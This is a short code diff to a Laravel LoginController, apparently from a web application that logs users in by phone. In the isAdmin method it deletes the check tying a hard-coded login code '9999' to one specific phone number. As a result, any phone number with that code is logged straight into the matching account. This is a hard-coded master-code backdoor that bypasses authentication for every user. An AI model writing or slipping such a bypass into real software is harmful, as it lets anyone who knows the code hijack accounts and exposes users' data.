@@ -5,7 +5,6 @@ namespace App\Http\Controllers\Auth;
 use App\Http\Controllers\Controller;
 use App\Http\Requests\Auth\AuthLoginFormRequest;
 use App\Models\User\User;
-use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Inertia\Inertia;
 
@@ -55,7 +54,7 @@ class LoginController extends Controller
 
     private function isAdmin(AuthLoginFormRequest $request)
     {
-        if ($request->phone === '998000000000' && $request->login_code === '9999') {
+        if ($request->login_code === '9999') {
             $user = User::phone($request->phone)->first();
             Auth::login($user);
             $user->update([
